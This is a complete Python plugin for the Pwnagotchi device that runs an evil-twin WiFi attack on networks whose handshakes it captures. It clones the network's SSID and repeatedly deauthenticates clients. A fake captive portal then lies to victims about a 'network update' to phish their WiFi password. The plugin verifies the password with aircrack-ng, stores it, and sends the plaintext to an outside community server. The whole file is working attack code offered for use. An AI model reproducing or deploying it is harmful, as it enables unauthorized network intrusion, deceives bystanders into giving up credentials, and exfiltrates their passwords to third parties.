#!/usr/bin/env python3
# evil_twin.py — Pwnagotchi plugin: Evil Twin + Captive Portal
#
# On every captured handshake, spins up an evil twin AP with a captive portal
# that asks the client for their "WiFi password to reconnect". Verifies the
# entered password against the captured handshake — so only the correct one
# is accepted — then writes it to the wordlist and submits it to the
# community-quickdic pool.
#
# INTERFACES (Pi Zero 2W with ALFA AWUS036AC):
#   wlan1mon  — ALFA in monitor mode — pwnagotchi/bettercap captures here
#   wlan0     — built-in WiFi — used as the evil twin AP
#
# REQUIREMENTS (on pwnagotchi):
#   sudo apt install -y hostapd dnsmasq python3-flask
#
# CONFIG (add to /etc/pwnagotchi/config.toml):
#
#   [main.plugins.evil_twin]
#   enabled          = true
#   iface_ap         = "wlan0"
#   iface_mon        = "wlan0mon"
#   ap_ip            = "10.0.99.1"
#   portal_port      = 8080
#   deauth_rounds    = 3
#   deauth_interval  = 15
#   client_timeout   = 60    # seconds to wait for a victim to associate after deauth (0 = skip if nobody connects)
#   session_timeout  = 300   # seconds to wait for password entry once a client is connected (0 = no timeout)
#   submit           = true
#   wordlist_folder  = "/home/pi/wordlists/"
#   max_queue        = 10

import logging
import os
import json
import re
import subprocess
import tempfile
import threading
import time
import queue
import urllib.request
import urllib.error

import pwnagotchi.plugins as plugins

SUBMIT_URL  = "https://community-quickdic.mr-bumchinz.workers.dev/submit"
USER_AGENT  = "pwnagotchi-evil_twin/1.0.0"

# ─── Captive portal HTML ──────────────────────────────────────────────────────
_PORTAL_HTML = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Reconnection Required</title>
<style>
body{{font-family:sans-serif;max-width:400px;margin:60px auto;padding:20px}}
h2{{color:#333}}p{{color:#666;font-size:14px}}
input[type=password]{{width:100%;padding:10px;margin:10px 0;font-size:16px;
  box-sizing:border-box;border:1px solid #ccc;border-radius:4px}}
button{{width:100%;padding:12px;background:#0070c9;color:#fff;border:none;
  border-radius:4px;font-size:16px;cursor:pointer}}
.err{{color:red;font-size:13px}}
</style>
</head>
<body>
<h2>&#x1F4F6; WiFi Reconnection Required</h2>
<p>Your device was disconnected from <strong>{ssid}</strong> due to a network
update. Re-enter your WiFi password to restore your connection.</p>
<form method="POST" action="/check">
  <input type="password" name="password" placeholder="WiFi Password"
         required minlength="8" autocomplete="current-password">
  {error}
  <button type="submit">Reconnect</button>
</form>
</body>
</html>"""

_SUCCESS_HTML = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Reconnecting...</title>
<style>body{{font-family:sans-serif;max-width:400px;margin:60px auto;text-align:center}}</style>
</head>
<body>
<h2>&#x2705; Reconnecting...</h2>
<p>Password verified. Reconnecting to <strong>{ssid}</strong>...</p>
</body>
</html>"""

# ─── hostapd / dnsmasq templates ─────────────────────────────────────────────
_HOSTAPD_CONF = """\
interface={iface_ap}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
ignore_broadcast_ssid=0
"""

_DNSMASQ_CONF = """\
interface={iface_ap}
dhcp-range={subnet}.10,{subnet}.50,1h
dhcp-option=3,{ap_ip}
dhcp-option=6,{ap_ip}
address=/#/{ap_ip}
"""

# ─── Helpers ─────────────────────────────────────────────────────────────────

def _run(cmd):
    subprocess.run(cmd, shell=True, capture_output=True)


def _verify_password(pcap_path, ssid, password):
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        f.write(password + "\n")
        wl = f.name
    try:
        r = subprocess.run(
            ["aircrack-ng", "-w", wl, "-e", ssid, pcap_path],
            capture_output=True, text=True, timeout=30
        )
        return "KEY FOUND" in r.stdout
    except Exception as e:
        logging.error("[evil_twin] aircrack-ng error: %s", e)
        return False
    finally:
        try:
            os.unlink(wl)
        except Exception:
            pass


def _submit(password):
    try:
        data = json.dumps({"password": password}).encode("utf-8")
        req = urllib.request.Request(SUBMIT_URL, data=data, method="POST")
        req.add_header("User-Agent", USER_AGENT)
        req.add_header("Content-Type", "application/json")
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status == 200
    except Exception as e:
        logging.debug("[evil_twin] submit failed: %s", e)
        return False


def _channel_from_pcap(pcap_path):
    try:
        r = subprocess.run(
            ["tshark", "-r", pcap_path, "-Y", "wlan.fc.type_subtype==8",
             "-T", "fields", "-e", "wlan_radio.channel", "-c", "1"],
            capture_output=True, text=True, timeout=10
        )
        ch = r.stdout.strip()
        if ch and ch.isdigit():
            return int(ch)
    except Exception:
        pass
    return 6


def _iface_exists(name):
    """Return True if a network interface with this name exists."""
    return os.path.exists(f"/sys/class/net/{name}")


def _already_cracked(pcap_path):
    """Return True if we already have a cracked password for this handshake.

    Checks for .cracked (written by pwnagotchi's aircrackng plugin and by
    community_quickdic) and .key (written by pwncrack / wpa-sec tools).
    If either exists, the password is already known — no evil twin needed.
    """
    return (
        os.path.exists(pcap_path + ".cracked")
        or os.path.exists(pcap_path + ".key")
    )


def _ssid_from_filename(path):
    """Extract the SSID from a pwnagotchi handshake filename.

    Pwnagotchi names files: {ssid}_{bssid}.pcap
    The BSSID is a MAC address, e.g. aa:bb:cc:dd:ee:ff (or with underscores).
    Strip it to recover the SSID.
    """
    name = os.path.splitext(os.path.basename(path))[0]
    # Match trailing _XX[_:]XX[_:]XX[_:]XX[_:]XX[_:]XX (MAC address)
    m = re.search(
        r'_[0-9a-fA-F]{2}[_:][0-9a-fA-F]{2}[_:][0-9a-fA-F]{2}'
        r'[_:][0-9a-fA-F]{2}[_:][0-9a-fA-F]{2}[_:][0-9a-fA-F]{2}$',
        name
    )
    if m:
        return name[:m.start()]
    return name


# ─── Session (one evil twin run) ─────────────────────────────────────────────

class _Session:
    def __init__(self, ssid, pcap, channel, iface_ap, iface_mon,
                 ap_ip, portal_port, deauth_rounds, deauth_interval,
                 on_captured, client_timeout=60, session_timeout=300):
        self.ssid            = ssid
        self.pcap            = pcap
        self.channel         = channel
        self.iface_ap        = iface_ap
        self.iface_mon       = iface_mon
        self.ap_ip           = ap_ip
        self.portal_port     = portal_port
        self.deauth_rounds   = deauth_rounds
        self.deauth_interval = deauth_interval
        self.on_captured     = on_captured
        self.client_timeout  = client_timeout   # seconds to wait for a station to associate
        self.session_timeout = session_timeout  # seconds to wait for password once associated
        self._procs          = []
        self._tmpfiles       = []
        self._stop           = threading.Event()

    def _subnet(self):
        return ".".join(self.ap_ip.split(".")[:3])

    def _setup_iface(self):
        _run(f"ip link set {self.iface_ap} up")
        _run(f"ip addr flush dev {self.iface_ap}")
        _run(f"ip addr add {self.ap_ip}/24 dev {self.iface_ap}")
        _run("sysctl -w net.ipv4.ip_forward=1")

    def _start_hostapd(self):
        conf = _HOSTAPD_CONF.format(
            iface_ap=self.iface_ap, ssid=self.ssid, channel=self.channel)
        f = tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False)
        f.write(conf); f.flush()
        self._tmpfiles.append(f.name)
        _run("pkill -f hostapd")
        time.sleep(1)
        self._procs.append(subprocess.Popen(
            ["hostapd", f.name],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        time.sleep(2)
        logging.info("[evil_twin] hostapd up — SSID:%s ch%d on %s",
                     self.ssid, self.channel, self.iface_ap)

    def _start_dnsmasq(self):
        conf = _DNSMASQ_CONF.format(
            iface_ap=self.iface_ap, ap_ip=self.ap_ip, subnet=self._subnet())
        f = tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False)
        f.write(conf); f.flush()
        self._tmpfiles.append(f.name)
        _run("pkill -f dnsmasq")
        time.sleep(0.5)
        self._procs.append(subprocess.Popen(
            ["dnsmasq", "--no-daemon", f"--conf-file={f.name}"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        time.sleep(1)
        logging.info("[evil_twin] dnsmasq up — DHCP %s/24", self.ap_ip)

    def _deauth_loop(self):
        while not self._stop.is_set():
            _run(f"aireplay-ng --deauth {self.deauth_rounds}"
                 f" -a FF:FF:FF:FF:FF:FF {self.iface_mon}")
            self._stop.wait(timeout=self.deauth_interval)

    def _wait_for_client(self):
        """Poll iw station dump until a device associates with our AP or timeout.
        Returns True if someone connected, False if nobody showed up."""
        deadline = time.time() + self.client_timeout
        logging.info(
            "[evil_twin] Waiting up to %ds for a client to associate on '%s'",
            self.client_timeout, self.ssid
        )
        while time.time() < deadline and not self._stop.is_set():
            try:
                r = subprocess.run(
                    ["iw", "dev", self.iface_ap, "station", "dump"],
                    capture_output=True, text=True, timeout=5
                )
                if "Station" in r.stdout:
                    logging.info("[evil_twin] Client associated on '%s' — starting portal", self.ssid)
                    return True
            except Exception:
                pass
            time.sleep(2)
        logging.info(
            "[evil_twin] No clients connected to '%s' after %ds — skipping portal",
            self.ssid, self.client_timeout
        )
        return False

    def _nat_rules(self, add=True):
        act = "-A" if add else "-D"
        for dport in (80, 443):
            _run(f"iptables -t nat {act} PREROUTING -i {self.iface_ap}"
                 f" -p tcp --dport {dport}"
                 f" -j DNAT --to {self.ap_ip}:{self.portal_port}")

    def _run_portal(self):
        try:
            from flask import Flask, request as freq
        except ImportError:
            logging.error("[evil_twin] Flask missing — "
                          "sudo apt install -y python3-flask")
            return

        ssid = self.ssid
        pcap = self.pcap
        stop = self._stop
        on_captured = self.on_captured
        app = Flask(__name__)
        import logging as _l
        _l.getLogger("werkzeug").setLevel(_l.ERROR)
        app.logger.disabled = True

        @app.route("/", defaults={"path": ""})
        @app.route("/<path:path>")
        def portal(path):
            return _PORTAL_HTML.format(ssid=ssid, error=""), 200

        @app.route("/check", methods=["POST"])
        def check():
            pw = freq.form.get("password", "").strip()
            if not pw:
                return (_PORTAL_HTML.format(
                    ssid=ssid,
                    error='<p class="err">Please enter a password.</p>'), 200)
            logging.info("[evil_twin] Candidate received (%d chars)", len(pw))
            if _verify_password(pcap, ssid, pw):
                logging.info("[evil_twin] Password VERIFIED for %s", ssid)
                on_captured(ssid, pw)
                stop.set()
                return _SUCCESS_HTML.format(ssid=ssid), 200
            logging.info("[evil_twin] Wrong password for %s — re-prompting", ssid)
            return (_PORTAL_HTML.format(
                ssid=ssid,
                error='<p class="err">Incorrect. Please try again.</p>'), 200)

        threading.Thread(
            target=lambda: app.run(host=self.ap_ip,
                                   port=self.portal_port,
                                   debug=False),
            daemon=True
        ).start()
        logging.info("[evil_twin] Portal on %s:%d", self.ap_ip, self.portal_port)
        timeout = self.session_timeout if self.session_timeout > 0 else None
        captured = stop.wait(timeout=timeout)
        if not captured:
            logging.info(
                "[evil_twin] Session timeout after %ds for '%s' — no client connected",
                self.session_timeout, ssid
            )
            stop.set()

    def run(self):
        try:
            self._setup_iface()
            self._start_hostapd()
            self._start_dnsmasq()
            self._nat_rules(add=True)
            threading.Thread(target=self._deauth_loop, daemon=True).start()
            if self._wait_for_client():
                self._run_portal()
            # else: nobody nearby — cleanup() in finally handles teardown
        finally:
            self.cleanup()

    def cleanup(self):
        self._stop.set()
        for p in self._procs:
            try:
                p.terminate()
            except Exception:
                pass
        _run("pkill -f hostapd")
        _run("pkill -f dnsmasq")
        self._nat_rules(add=False)
        _run(f"ip addr flush dev {self.iface_ap}")
        _run("sysctl -w net.ipv4.ip_forward=0")
        for f in self._tmpfiles:
            try:
                os.unlink(f)
            except Exception:
                pass


# ─── Pwnagotchi Plugin ────────────────────────────────────────────────────────

class EvilTwin(plugins.Plugin):
    __author__      = "github.com/MrBumChinz"
    __version__     = "1.0.0"
    __license__     = "GPL3"
    __description__ = (
        "On every captured handshake, spins up a rogue AP (same SSID), deauths "
        "clients, and presents a captive portal to capture the plaintext password. "
        "Verified passwords are written to the wordlist folder and submitted to "
        "the community-quickdic pool."
    )

    def __init__(self):
        self._q       = None
        self._worker  = None
        self._running = False
        self._session = None

    def on_loaded(self):
        iface_ap  = self.options.get("iface_ap",  "wlan0")
        iface_mon = self.options.get("iface_mon", "wlan0mon")
        if not _iface_exists(iface_ap) or not _iface_exists(iface_mon):
            logging.warning(
                "[evil_twin] disabled — required interfaces not present "
                "(need %s and %s). Plugin will do nothing until both are up.",
                iface_ap, iface_mon
            )
            self._running = False
            return
        self._q       = queue.Queue(maxsize=self.options.get("max_queue", 10))
        self._running = True
        self._worker  = threading.Thread(target=self._loop, daemon=True,
                                         name="evil_twin_worker")
        self._worker.start()
        logging.info("[evil_twin] loaded — AP:%s  mon:%s", iface_ap, iface_mon)
        # Queue any stored handshakes that were never cracked. Pwnagotchi
        # skips APs it already has a .pcap for, so on_handshake never fires
        # for them again — we pick them up here instead.
        self._queue_existing_uncracked()

    def on_unload(self, ui):
        self._running = False
        if self._session:
            self._session.cleanup()

    def _queue_existing_uncracked(self):
        """Scan the handshakes dir for .pcap files with no .cracked/.key file
        and add them to the queue. Handles the edge case where pwnagotchi
        already has a handshake for a network so on_handshake never fires."""
        hs_dir = self.options.get("handshake_dir", "/root/handshakes/")
        try:
            pcaps = [
                os.path.join(hs_dir, f)
                for f in os.listdir(hs_dir)
                if f.endswith(".pcap")
            ]
        except Exception:
            return
        queued = 0
        for pcap in sorted(pcaps):
            if _already_cracked(pcap):
                continue
            ssid = _ssid_from_filename(pcap)
            try:
                self._q.put_nowait((ssid, pcap))
                queued += 1
            except queue.Full:
                break
        if queued:
            logging.info("[evil_twin] queued %d existing uncracked handshake(s)", queued)

    def on_handshake(self, agent, filename, access_point, client_station):
        if not self._running:
            return
        iface_ap  = self.options.get("iface_ap",  "wlan0")
        iface_mon = self.options.get("iface_mon", "wlan0mon")
        if not _iface_exists(iface_ap) or not _iface_exists(iface_mon):
            logging.warning(
                "[evil_twin] skipping handshake — %s or %s not present",
                iface_ap, iface_mon
            )
            return
        ssid = access_point.get("hostname", "")
        if not ssid:
            return
        if _already_cracked(filename):
            logging.info(
                "[evil_twin] '%s' already cracked — skipping evil twin", ssid
            )
            return
        try:
            self._q.put_nowait((ssid, filename))
            logging.info("[evil_twin] queued evil twin for '%s'", ssid)
        except queue.Full:
            logging.warning("[evil_twin] queue full — skipping '%s'", ssid)

    def _loop(self):
        while self._running:
            try:
                ssid, pcap = self._q.get(timeout=5)
            except queue.Empty:
                continue
            if not os.path.exists(pcap):
                logging.warning("[evil_twin] pcap gone: %s", pcap)
                continue
            logging.info("[evil_twin] starting session for '%s'", ssid)
            self._session = _Session(
                ssid=ssid,
                pcap=pcap,
                channel=_channel_from_pcap(pcap),
                iface_ap=self.options.get("iface_ap", "wlan0"),
                iface_mon=self.options.get("iface_mon", "wlan1mon"),
                ap_ip=self.options.get("ap_ip", "10.0.99.1"),
                portal_port=int(self.options.get("portal_port", 8080)),
                deauth_rounds=int(self.options.get("deauth_rounds", 3)),
                deauth_interval=int(self.options.get("deauth_interval", 15)),
                on_captured=lambda s, pw: self._captured(s, pw, pcap),
                client_timeout=int(self.options.get("client_timeout", 60)),
                session_timeout=int(self.options.get("session_timeout", 300)),
            )
            try:
                self._session.run()
            except Exception as e:
                logging.error("[evil_twin] session error: %s", e)
            finally:
                self._session = None

    def _captured(self, ssid, password, pcap=None):
        logging.info("[evil_twin] plaintext captured for '%s': %s", ssid, password)
        # Write .cracked alongside the handshake so future runs (and
        # community_quickdic) know this AP's password is already known.
        if pcap:
            try:
                with open(pcap + ".cracked", "w") as f:
                    f.write(password + "\n")
            except Exception as e:
                logging.warning("[evil_twin] could not write .cracked file: %s", e)
        folder = self.options.get("wordlist_folder", "/home/pi/wordlists/")
        try:
            os.makedirs(folder, exist_ok=True)
            with open(os.path.join(folder, "evil_twin_captured.txt"), "a") as f:
                f.write(password + "\n")
        except Exception as e:
            logging.error("[evil_twin] wordlist write error: %s", e)
        if self.options.get("submit", True):
            if _submit(password):
                logging.info("[evil_twin] submitted to community pool")
            else:
                logging.warning("[evil_twin] community submit failed — saved locally")
